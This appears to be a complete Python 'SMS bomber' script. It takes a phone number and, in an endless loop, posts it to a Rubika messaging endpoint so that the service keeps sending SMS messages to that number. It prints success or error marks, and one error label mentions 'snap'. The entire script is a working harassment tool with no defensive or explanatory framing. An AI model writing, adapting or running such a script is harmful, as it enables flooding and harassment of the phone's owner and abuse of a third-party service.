import requests
from colorama import Fore, Back, Style
import pyfiglet
import pandas as pd


phone = input("Enter the phone number: ")

while True:
     rubika = {"cellphone": phone} 
     rubika = requests.post("https://messengerg2c17.iranlms.ir/" ,json=rubika)
     if rubika.status_code == 200:
       print("rubika | send sms ↳ ✓")
     else:
       print(Fore.RED, "snap | error sms ↳ ×")
       print(Fore.GREEN)
  
  